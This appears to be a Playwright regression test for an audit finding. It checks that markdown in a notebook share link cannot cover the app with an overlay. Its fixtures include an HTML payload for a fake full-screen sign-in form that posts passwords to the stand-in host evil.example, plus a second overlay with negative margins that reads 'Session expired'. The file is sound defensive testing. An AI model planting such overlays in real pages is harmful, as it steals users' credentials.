import { test, expect } from '@playwright/test';
import LZString from 'lz-string';

// Regression for audit finding S1: a share link whose notebook markdown tries to
// cover the app with a fake sign-in form and post credentials off-site.
const notebook = (source: string) =>
  JSON.stringify({
    nbformat: 4,
    nbformat_minor: 5,
    metadata: {},
    cells: [{ cell_type: 'markdown', id: 'c1', metadata: {}, source }]
  });

const fixedOverlay =
  '<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">' +
  '<form action="https://evil.example/collect"><input name="password" type="password">' +
  '<button>Sign in</button></form></div>';

// position:relative is allowed, so only CSS containment stops this one.
const relativeOverlay =
  '<div style="position:relative;z-index:2147483647;margin:-3000px 0 0 -3000px;' +
  'width:9000px;height:9000px;background:#fff">Session expired</div>';

const shareLink = (markdown: string) =>
  './#s=' +
  LZString.compressToEncodedURIComponent(
    JSON.stringify({ mode: 'notebook', a: notebook('# Report'), b: notebook(markdown) })
  );

const overlayAtCentre = (page: import('@playwright/test').Page) =>
  page.evaluate(() => {
    const el = document.elementFromPoint(window.innerWidth / 2, window.innerHeight / 2);
    return Boolean(el?.closest('.rendered-prose [style]'));
  });

test.describe('Share-link markdown cannot take over the page (S1)', () => {
  for (const [name, payload] of [
    ['fixed overlay with form', fixedOverlay],
    ['relative overlay with negative margins', relativeOverlay]
  ] as const) {
    test(name, async ({ page }) => {
      let exfiltrated = false;
      await page.route('https://evil.example/**', (route) => {
        exfiltrated = true;
        return route.abort();
      });

      await page.goto(shareLink('# Report\n\n' + payload));
      await expect(page.locator('.rendered-prose').first()).toBeVisible();

      await expect(page.locator('.rendered-prose form')).toHaveCount(0);
      expect(await overlayAtCentre(page)).toBe(false);
      expect(exfiltrated).toBe(false);
    });
  }

  // Backstop if a fixed-position style ever slips past the sanitizer: overflow on the
  // card does not clip position:fixed, but contain: paint does.
  test('rendered markdown is paint-contained', async ({ page }) => {
    await page.goto(shareLink('# Report\n\nchanged'));
    const prose = page.locator('.rendered-prose').first();
    await expect(prose).toBeVisible();
    expect(await prose.evaluate((el) => getComputedStyle(el).contain)).toContain('paint');
  });
});
